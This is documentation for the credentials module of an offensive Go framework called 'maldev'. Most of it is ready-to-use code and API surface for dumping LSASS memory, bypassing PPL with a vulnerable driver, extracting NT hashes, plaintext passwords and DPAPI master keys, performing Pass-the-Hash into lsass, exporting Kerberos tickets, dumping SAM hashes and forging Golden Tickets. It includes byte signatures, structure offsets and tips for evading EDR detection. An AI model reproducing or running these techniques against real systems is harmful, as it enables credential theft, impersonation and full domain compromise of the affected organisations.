[← Back to README](../README.md)

# Credentials — LSASS dump, SAM dump, PTH, kirbi, Golden Ticket

The `credentials/` tree groups four packages by acquisition target:

| Package | Role | Platform | Touches |
|---|---|---|---|
| `credentials/lsassdump` | **Producer** — captures lsass.exe memory into a MINIDUMP blob (T1003.001) | Windows | `NtOpenProcess` + `NtReadVirtualMemory` against lsass; optionally a `kernel/driver.ReadWriter` for PPL bypass |
| `credentials/sekurlsa` | **Consumer** — parses a MINIDUMP, decrypts every walker (MSV1_0 / Wdigest / Kerberos / DPAPI / TSPkg / CloudAP / LiveSSP / CredMan), exposes Pass-the-Hash write-back (T1550.002) and Kerberos kirbi export (T1550.003) | cross-platform (pure Go) | nothing for parse; PTH writes back into live lsass via `NtWriteVirtualMemory` |
| `credentials/samdump` | **Offline SAM/SYSTEM hive parser** — extracts NT/LM hashes from registry hive files (T1003.002) | cross-platform (pure Go) | live mode (`LiveDump`) shells `reg save`; offline mode is bytes-in / Account-out |
| `credentials/goldenticket` | **Golden Ticket** — pure-Go PAC marshaling + KRB5 `Forge` + LSA `Submit` via `Secur32!LsaCallAuthenticationPackage(KerbSubmitTicketMessage)` (T1558.001 / T1550.003) | Windows for `Submit`, cross-platform for `Forge` | LSA RPC for ticket injection |

Pair them in-process for "dump → extract → wipe" with no on-disk
persistence:

```go
import (
    "bytes"
    "github.com/oioio-space/maldev/credentials/lsassdump"
    "github.com/oioio-space/maldev/credentials/sekurlsa"
)

// 1. Dump.
h, _ := lsassdump.OpenLSASS(nil)
defer lsassdump.CloseLSASS(h)
var buf bytes.Buffer
if _, err := lsassdump.Dump(h, &buf, nil); err != nil { panic(err) }

// 2. Parse the bytes still in memory — no disk write.
result, err := sekurlsa.Parse(bytes.NewReader(buf.Bytes()), int64(buf.Len()))
if err != nil { /* errors.Is(err, sekurlsa.ErrUnsupportedBuild) → register a template */ }
defer result.Wipe()

// 3. Use the credentials.
for _, s := range result.Sessions {
    for _, c := range s.Credentials {
        if msv, ok := c.(sekurlsa.MSV1_0Credential); ok {
            fmt.Println(msv.String()) // pwdump format ready for pth tools
        }
    }
}
```

For the Win11 + RunAsPPL=1 case where lsass refuses VM_READ, layer
`credentials/lsassdump.Unprotect` (driver-assisted PPL bypass — see
[lsass-dump.md](techniques/collection/lsass-dump.md)) before the
`OpenLSASS` call. Same `kernel/driver.ReadWriter` (RTCore64, GDRV,
custom) plugs into both the Unprotect path and `evasion/kcallback`'s
Remove path.

---

## `credentials/lsassdump`

See [`docs/techniques/collection/lsass-dump.md`](techniques/collection/lsass-dump.md).

Producer surface:

- `OpenLSASS(*wsyscall.Caller) (uintptr, error)` — `NtGetNextProcess` walk + targeted `NtOpenProcess(VM_READ)`.
- `Dump(handle, w io.Writer, *wsyscall.Caller) (Stats, error)` — streams a MINIDUMP to `w` without an in-memory copy of the regions.
- `DumpToFile(path, *wsyscall.Caller) (Stats, error)` — convenience wrapper.
- `Unprotect(rw driver.ReadWriter, eprocess uintptr, tab PPLOffsetTable) (PPLToken, error)` + `Reprotect(tok, rw)` — EPROCESS-byte unprotect for PPL bypass.

The MINIDUMP layout matches `MiniDumpWriteDump(MiniDumpWithFullMemory)`,
making `lsassdump`'s output directly compatible with mimikatz's
`!sekurlsa::minidump` and pypykatz's `pypykatz lsa minidump`.

---

## `credentials/sekurlsa`

The consumer is **complete with inline default Templates** at
v0.23.2: the MINIDUMP reader, LSA crypto layer, MSV1_0 walker,
`Parse(reader, size)` public entry-point, and built-in Win10/Win11
templates all ship and round-trip end-to-end against synthetic
fixtures. A dump from one of the documented builds parses **without
any operator setup**.

Templates that ship inline (registered automatically via `init()`):

| Build range | Coverage |
|---|---|
| 18362 – 19045 | Win10 19H1 (1903) → Win10 22H2 |
| 22000 – 22621 | Win11 21H2 → Win11 22H2 (pre-22622) |

Builds outside those ranges (Win10 1809 / 1607 / RTM, Win11 22622+ /
23H2 / 24H2, Server 2019 / 2022 / 2025) return `ErrUnsupportedBuild`
from Parse. For those, operators call `RegisterTemplate(...)` at
init time with the per-build offsets — see [Registering a
Template](#registering-a-template) below. Adding a build means
walking lsasrv.dll for that LCU with IDA/Ghidra, locating the
global-load instruction sequence, and recording the surrounding
byte pattern + rel32 offsets.

**Canonical references** for the byte patterns + offsets:

- [`pypykatz`](https://github.com/skelsec/pypykatz) (GPL-3) —
  `pypykatz/lsadecryptor/lsa_template_nt6.py` for the LSA
  IV/3DES/AES patterns; `pypykatz/lsadecryptor/packages/msv/templates.py`
  for the MSV1_0 LogonSessionList signature + per-build node
  layouts (`KIWI_MSV1_0_LIST_62/63/64/65`).
- [`mimikatz`](https://github.com/gentilkiwi/mimikatz) (CC-NC) —
  `mimikatz/modules/sekurlsa/kuhl_m_sekurlsa_*.c` for the same
  patterns from the original research source.

Licensing: pypykatz is GPL-3, mimikatz is CC-BY-NC-SA. We don't
redistribute their code. Byte patterns extracted from public
Microsoft binaries are factual observations, not copyrightable in
themselves — every credential-extraction tool reuses them because
they're empirical. Operators register templates via
`RegisterTemplate(t)` at init time; the byte values stay in
operator hands, the framework stays in the repo.

For the v0.23.x Win10/Win11 baseline, the published values are:

| Region | Signature (lsasrv.dll) | IV off | 3DES off | AES off |
|---|---|---|---|---|
| Win10 1809–22H2 / Win11 21H2–22H2 (build 17763–22621) | `83 64 24 30 00 48 8D 45 E0 44 8B 4D D8 48 8D 15` | +0x43 | -0x59 | +0x10 |
| Win11 23H2 (22631) | (different signature — see references) | | | |

| MSV signature (lsasrv.dll) | first_entry | bucket_count |
|---|---|---|
| Win10 1903 – Win11 22621 | `33 FF 41 89 37 4C 8B F3 45 85 C0 74` | +23 | -4 |
| Win11 22622 – 22631 | `45 89 34 24 4C 8B FF 8B F3 45 85 C0 74` | +24 | -4 |

The `KIWI_MSV1_0_LIST_63` node layout (Win10 22H2) computes to:
LUID=0x70, UserName=0x90, Domain=0xA0, LogonServer=0xF8,
LogonType=0xD8, LogonTime=0xF0, SID=0xD0, Credentials=0x108,
NodeSize≥0x180.

### Surface

```go
// Parse extracts credentials from a MINIDUMP blob.
func Parse(reader io.ReaderAt, size int64) (*Result, error)
func ParseFile(path string) (*Result, error)

// Result. BuildNumber + Architecture + Modules populate even when
// no template covers the build, so callers can detect support.
type Result struct {
    BuildNumber  uint32
    Architecture Architecture
    Modules      []Module
    Sessions     []LogonSession
    Warnings     []string
}
func (r *Result) ModuleByName(name string) (Module, bool)
func (r *Result) Wipe()

// Credentials. Each provider implements the same interface so callers
// can range over Session.Credentials uniformly.
type Credential interface {
    AuthPackage() string
}

// MSV1_0Credential — NT/LM/SHA1 hashes (the pass-the-hash pivot).
type MSV1_0Credential struct {
    UserName    string
    LogonDomain string
    NTHash      [16]byte
    LMHash      [16]byte
    SHA1Hash    [20]byte
    DPAPIKey    [16]byte
    Found       bool
}
func (MSV1_0Credential) AuthPackage() string  // → "MSV1_0"
func (MSV1_0Credential) String() string       // → pwdump format

// WdigestCredential — plaintext password (when UseLogonCredential=1).
type WdigestCredential struct {
    UserName    string
    LogonDomain string
    Password    string
    Found       bool
}
func (WdigestCredential) AuthPackage() string  // → "Wdigest"
func (WdigestCredential) String() string       // → "Domain\User:Password"

// DPAPIMasterKey — pre-decrypted master key from g_MasterKeyCacheList.
// Feed KeyBytes to BCryptDecrypt to unwrap Chrome cookies / Vault
// credentials / WinRM saved sessions / etc.
type DPAPIMasterKey struct {
    LUID     uint64
    KeyGUID  [16]byte
    KeyBytes []byte
    Found    bool
}
func (DPAPIMasterKey) AuthPackage() string  // → "DPAPI"
func (DPAPIMasterKey) String() string       // → "{guid}:hex"
func (DPAPIMasterKey) GUIDString() string   // → "8-4-4-4-12" canonical form

// Per-build templates. Operators register their own at init when
// the dump's BuildNumber doesn't match a built-in.
type Template struct {
    BuildMin, BuildMax uint32
    IVPattern          []byte
    IVWildcards        []int
    IVOffset           int32
    Key3DESPattern     []byte
    Key3DESWildcards   []int
    Key3DESOffset      int32
    KeyAESPattern      []byte
    KeyAESWildcards    []int
    KeyAESOffset       int32
    LogonSessionListPattern   []byte
    LogonSessionListWildcards []int
    LogonSessionListOffset    int32
    LogonSessionListCount     int
    MSVLayout                 MSVLayout

    // Wdigest fields — opt-in. Set NodeSize=0 (zero value) and the
    // Wdigest walker is skipped at no runtime cost.
    WdigestListPattern   []byte
    WdigestListWildcards []int
    WdigestListOffset    int32
    WdigestLayout        WdigestLayout

    // DPAPI master-key cache fields — opt-in.
    DPAPIListPattern   []byte
    DPAPIListWildcards []int
    DPAPIListOffset    int32
    DPAPILayout        DPAPILayout
}

// WdigestLayout — KIWI_WDIGEST_LIST_ENTRY node offsets per build.
type WdigestLayout struct {
    NodeSize       uint32
    LUIDOffset     uint32
    UserNameOffset uint32
    DomainOffset   uint32
    PasswordOffset uint32
}

// DPAPILayout — KIWI_MASTERKEY_CACHE_ENTRY node offsets per build.
type DPAPILayout struct {
    NodeSize       uint32
    LUIDOffset     uint32
    KeyGUIDOffset  uint32
    KeySizeOffset  uint32
    KeyBytesOffset uint32
}
func RegisterTemplate(*Template) error

// Sentinels.
var (
    ErrNotMinidump        // input not MDMP
    ErrUnsupportedBuild   // no Template covers SystemInfo.BuildNumber
    ErrLSASRVNotFound     // lsasrv.dll missing from MODULE_LIST
    ErrMSV1_0NotFound     // msv1_0.dll missing from MODULE_LIST
    ErrKeyExtractFailed   // pattern matched but BCRYPT blob malformed
)
```

### Registering a Template

```go
import "github.com/oioio-space/maldev/credentials/sekurlsa"

func init() {
    _ = sekurlsa.RegisterTemplate(&sekurlsa.Template{
        BuildMin: 19045, BuildMax: 19045, // Win10 22H2
        IVPattern:      []byte{ /* … 12-byte signature near the IV load instruction … */ },
        IVWildcards:    []int{ /* per-CU drift positions */ },
        IVOffset:       63, // signed bytes from match start to the rel32
        Key3DESPattern: []byte{ /* … */ },
        Key3DESOffset:  -89,
        KeyAESPattern:  []byte{ /* … */ },
        KeyAESOffset:   16,
        LogonSessionListPattern: []byte{ /* … */ },
        LogonSessionListOffset:  23,
        LogonSessionListCount:   32, // Win10 has 32 buckets
        MSVLayout: sekurlsa.MSVLayout{
            NodeSize:          0x100,
            LUIDOffset:        0x10,
            UserNameOffset:    0x90,
            LogonDomainOffset: 0xA0,
            LogonServerOffset: 0xB0,
            LogonTypeOffset:   0xC8,
            CredentialsOffset: 0xD8,
        },
    })
}
```

### Wdigest provider (v0.24.0+)

The Wdigest provider lives in `wdigest.dll` and stores a doubly-linked
list of session nodes whose `Password` field holds an LSA-encrypted
UTF-16LE plaintext. When `HKLM\System\CurrentControlSet\Control
\SecurityProviders\WDigest\UseLogonCredential = 1` (Microsoft set the
default to `0` in Windows 8.1 / KB2871997), every active interactive
logon caches its plaintext in this list — the dump returns the
attacker's cleartext credential, no hash-cracking required.

The walker auto-disables when the registered Template has
`WdigestLayout.NodeSize == 0`. The v0.23.x default templates do not
yet enable Wdigest — auto-enable awaits offset verification against
a real Win10/Win11 wdigest.dll. Operators with verified offsets
register an extended Template:

```go
import "github.com/oioio-space/maldev/credentials/sekurlsa"

func init() {
    _ = sekurlsa.RegisterTemplate(&sekurlsa.Template{
        BuildMin: 19045, BuildMax: 19045, // Win10 22H2

        // LSA crypto fields (same as the MSV-only template).
        IVPattern:      []byte{ /* … */ },
        IVOffset:       0x43,
        Key3DESPattern: []byte{ /* … */ },
        Key3DESOffset:  -0x59,
        KeyAESPattern:  []byte{ /* … */ },
        KeyAESOffset:   0x10,

        // MSV1_0 fields.
        LogonSessionListPattern: []byte{ /* … */ },
        LogonSessionListOffset:  23,
        LogonSessionListCount:   32,
        MSVLayout: sekurlsa.MSVLayout{ /* … */ },

        // Wdigest fields — new.
        WdigestListPattern: []byte{ /* per-build wdigest signature */ },
        WdigestListOffset:  -4, // pypykatz uses -4 from the cmp/je sequence
        WdigestLayout: sekurlsa.WdigestLayout{
            NodeSize:       0x80,  // KIWI_WDIGEST_LIST_ENTRY size
            LUIDOffset:     0x28,
            UserNameOffset: 0x38,
            DomainOffset:   0x48,
            PasswordOffset: 0x58,
        },
    })
}
```

After Parse: a Wdigest credential whose LUID matches an MSV session
joins that session's `Credentials` slice (NT hash + plaintext side
by side). Wdigest sessions whose LUID has no MSV match surface as
new sessions with only the WdigestCredential — no MSV-only fields
populated (LogonType, SID).

### DPAPI master-key cache (v0.25.0+)

DPAPI master keys live in `lsasrv.dll`'s `g_MasterKeyCacheList`
global as a doubly-linked list of `KIWI_MASTERKEY_CACHE_ENTRY`
nodes. Each entry carries a LUID, a 16-byte GUID identifying the
master key, and the inline key bytes — typically 64 bytes,
**already decrypted** in the cache. No LSA crypto round-trip is
needed for this path; the walker reads the bytes as-is.

Downstream use: feed the key bytes to `BCryptDecrypt` (or
`CryptUnprotectData`) to unwrap any DPAPI-protected blob bound to
that LUID — Chrome / Edge / Firefox saved cookies and passwords,
Windows Vault credentials, WinRM saved sessions, RDP saved
credentials, Outlook PSTs, etc.

The walker auto-disables when the registered Template has
`DPAPILayout.NodeSize == 0`. Operators with verified offsets
extend the Template at registration time:

```go
import "github.com/oioio-space/maldev/credentials/sekurlsa"

func init() {
    _ = sekurlsa.RegisterTemplate(&sekurlsa.Template{
        BuildMin: 19045, BuildMax: 19045, // Win10 22H2

        // … LSA + MSV + (optional) Wdigest fields …

        DPAPIListPattern: []byte{ /* per-build dpapi signature */ },
        DPAPIListOffset:  /* signed bytes from match start to rel32 */ 0,
        DPAPILayout: sekurlsa.DPAPILayout{
            NodeSize:       0x80,
            LUIDOffset:     0x10, // KIWI_MASTERKEY_CACHE_ENTRY.LogonId
            KeyGUIDOffset:  0x18, // .KeyUid (GUID)
            KeySizeOffset:  0x28, // .keySize (uint32)
            KeyBytesOffset: 0x30, // inline key payload
        },
    })
}
```

After Parse: a master key whose LUID matches an existing session
joins that session's `Credentials` slice. Master keys whose LUID
has no match surface as new sessions carrying only the
`DPAPIMasterKey` credential — same orphan-surface semantics as
Wdigest.

### Detection

**Low**. `sekurlsa.Parse` runs entirely in the implant's own
address space with pure-Go primitives — no Win32 calls, no
filesystem access, no further detection surface. The loud
operations are the dump itself (covered in
[lsass-dump.md](techniques/collection/lsass-dump.md)) and any
optional driver-assisted PPL bypass.

### Limitations

- v0.32.x ships every walker (MSV1_0 / Wdigest / DPAPI / TSPkg /
  Kerberos / CloudAP / LiveSSP / CredMan) with built-in templates
  for Win 7 SP1 → Win 11 25H2.
- x64 only. The `Architecture` enum reserves `ArchX86` for a future
  WoW64 variant.
- Credential Guard / LSAISO trustlet sessions surface as warnings —
  the dump contains the wrappers but the secrets are kernel-isolated
  ciphertext we can't decrypt without a separate primitive.

---

## `credentials/sekurlsa` — Pass-the-Hash (`Pass` / `PassImpersonate`)

`Pass` and `PassImpersonate` write the operator's NTLM (and
optionally AES128/AES256) credentials back into a freshly-spawned
process's lsass session. The spawned process then outbound-
authenticates as the impersonated principal on every subsequent
network auth (SMB, RDP, NTLM challenge-response, and — when AES
keys are supplied — Kerberos AS-REQ pre-auth).

```go
import "github.com/oioio-space/maldev/credentials/sekurlsa"

ntlm, _ := hex.DecodeString("31d6cfe0d16ae931b73c59d7e0c089c0") // empty-string NT
res, err := sekurlsa.Pass(sekurlsa.PTHParams{
    Decoy: `C:\Windows\System32\cmd.exe`,
    DecoyArgs: `/c "ping -t 127.0.0.1 -n 99999 >nul"`, // long-running stub
    Target: sekurlsa.PTHTarget{
        Domain: "CORP", Username: "alice",
        NTLM: ntlm, // 16 bytes
    },
})
if err != nil { /* errors.Is(err, sekurlsa.ErrPTHNoMatchingLUID) → spawn lost the LUID */ }
fmt.Printf("PID=%d MSV=%v Kerb=%v\n", res.PID, res.MSVOverwritten, res.KerberosOverwritten)
// res.PID is the spawned process — operator's "handle" to the impersonated session.
```

`PassImpersonate` adds a final `SetThreadToken` step so the calling
thread *also* outbound-authenticates as the target until
`windows.RevertToSelf()`. MITRE: T1550.002.

Detection level: **HIGH** for both — `PROCESS_VM_WRITE` on lsass is
one of the loudest events any EDR watches. Route the
`NtWriteVirtualMemory` calls through a `*wsyscall.Caller` (passed in
`PTHParams.Caller`) to reduce the user-mode hook surface.

---

## `credentials/sekurlsa` — Kerberos kirbi export (`KerberosTicket.ToKirbi`)

Every `KerberosTicket` returned by `sekurlsa.Parse` carries the
ASN.1-encoded ticket bytes plus, on builds with a registered
`KerberosLayout.TicketSessionKey*Offset`, the decrypted per-ticket
session key. `ToKirbi` wraps these into the mimikatz-format KRB-CRED
file ready for Rubeus / impacket / pypykatz consumption (T1550.003).

```go
for _, s := range result.Sessions {
    for _, c := range s.Credentials {
        if k, ok := c.(*sekurlsa.KerberosCredential); ok {
            for _, t := range k.Tickets {
                path, err := t.ToKirbiFile("./tickets/")
                if err != nil { continue }
                fmt.Printf("exported %s\n", path)
            }
        }
    }
}
```

The exported `.kirbi` is a valid APPLICATION 22 KRB-CRED with an
unencrypted EncKrbCredPart (etype=0 convention) — Rubeus describe,
impacket ticketConverter, and gettgtpkinit all parse it directly.
Replay (`Pass-the-Ticket`) needs the session key, which the walker
extracts from `KIWI_KERBEROS_INTERNAL_TICKET` on Win 10 1607+ /
Win 11 21H2+ builds.

---

## `credentials/samdump`

Pure-Go offline dump of the Windows SAM hive. Pair with a
pre-staged SYSTEM hive (the boot key lives there) to recover every
local account's NT/LM hash without touching lsass. MITRE: T1003.002.

| Mode | Surface | Detection |
|---|---|---|
| Offline | `Dump(systemReader, systemSize, samReader, samSize) (Result, error)` | none on parse — pure-Go REGF + crypto math |
| Live (Windows) | `LiveDump(dir string) (Result, sysPath, samPath string, error)` | HIGH — `reg save HKLM\SAM` is a Defender behavioral signal |

```go
import "github.com/oioio-space/maldev/credentials/samdump"

// Offline — operator already exfilled the hives.
sysF, _ := os.Open("system.hive")
defer sysF.Close()
sysSt, _ := sysF.Stat()
samF, _ := os.Open("sam.hive")
defer samF.Close()
samSt, _ := samF.Stat()

res, err := samdump.Dump(sysF, sysSt.Size(), samF, samSt.Size())
if err != nil { /* errors.Is(err, samdump.ErrBootKey) → SYSTEM hive incomplete */ }

fmt.Print(res.Pwdump())
// alice:1001:00000000000000000000000000000000:0cb6948805f797bf2a82807973b89537:::
// bob:1002:00000000000000000000000000000000:c35565c5879bc7a79c506a39d054a03f:::
```

Algorithm:

1. SYSTEM hive → walk `ControlSet001\Control\Lsa\{JD,Skew1,GBG,Data}`
   → 16 raw bytes scattered across class-name strings →
   permute through Microsoft's stable 16-position table → boot key.
2. SAM hive → `Domains\Account\F` → SAM_KEY_DATA_AES envelope (or
   legacy SAM_KEY) → AES-128-CBC(bootkey, IV=Salt).decrypt → first
   16 bytes are the per-domain hashed bootkey.
3. SAM hive → `Domains\Account\Users\<RID-hex>\V` → 0xCC-byte offset
   table → username + per-user NT/LM SAM_HASH wrapper.
4. Per user: SAM_HASH revision dispatch (legacy MD5+RC4 vs AES
   envelope) → 16-byte intermediate → split RID into two DES keys
   via `transformKey56to64` → DES-ECB decrypt the two halves → final
   NT/LM hash.

Validated on Win 10 1809 + Win 11 24H2 — both round-trip the
canonical empty-string hashes for built-in Administrator + Guest
(no warnings) and recover 16-byte NT hashes for password-set
accounts. Cross-build determinism verified (same `test` user
produces identical hash on both VMs).

Limitations:

- `LiveDump` shells `reg save`; `NtSaveKey` direct-syscall path is
  queued.
- VSS shadow-copy acquisition (for files reg-save can't reach —
  `NTDS.dit`, `lsass.exe`) lives under `recon/shadowcopy` — separate
  effort.
- AD `NTDS.dit` parsing (T1003.003) is a separate package; the SAM
  algorithm only covers local-machine hives.

---

## `credentials/goldenticket`

`Forge` builds a Golden Ticket (encrypted TGT) from operator-
supplied krbtgt key + domain SID + user RID; `Submit` injects a
serialized ticket into the calling user's LSA cache via
`Secur32!LsaCallAuthenticationPackage(KerbSubmitTicketMessage)`.

```go
import "github.com/oioio-space/maldev/credentials/goldenticket"

ticket, err := goldenticket.Forge(goldenticket.ForgeParams{
    User: "Administrator", Domain: "CORP.LOCAL",
    DomainSID: "S-1-5-21-3623811015-3361044348-30300820",
    UserRID: 500,
    KrbtgtKey: krbtgtAES256, // from DCSync or NTDS dump
    KrbtgtKeyType: 18,        // AES256_CTS_HMAC_SHA1_96
})
if err != nil { panic(err) }
if err := goldenticket.Submit(ticket); err != nil { panic(err) }
// Operator's process now uses the forged TGT for every Kerberos
// outbound until windows.RevertToSelf() or thread exit.
```

MITRE: T1558.001 (Forge) + T1550.003 (Submit). Detection level:
**MEDIUM-HIGH** — domain controllers can flag forged TGTs by
mismatched signature checksums (PAC validation), unusual ticket
lifetimes, or replay against the same krbtgt KVNO.
